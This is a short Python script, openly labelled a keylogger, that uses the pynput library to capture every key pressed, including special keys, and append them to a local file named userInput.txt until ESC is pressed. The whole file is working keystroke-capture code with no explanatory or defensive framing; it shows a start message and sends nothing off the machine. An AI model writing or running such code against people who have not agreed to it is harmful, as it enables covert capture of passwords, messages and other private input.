
from pynput import keyboard

def userInput(key):
    with open('userInput.txt', 'a') as file:
        try:
            # Handle printable character keys
            file.write(f"{key.char}")
        except AttributeError:
            # Handle special keys
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.tab:
                file.write("\t")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                file.write("[ESC]")
                return False
            else:
                file.write(f"[{key.name.upper()}]")

def main():
    print("Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=userInput) as listener:
        listener.join()

if __name__ == "__main__":
    main()
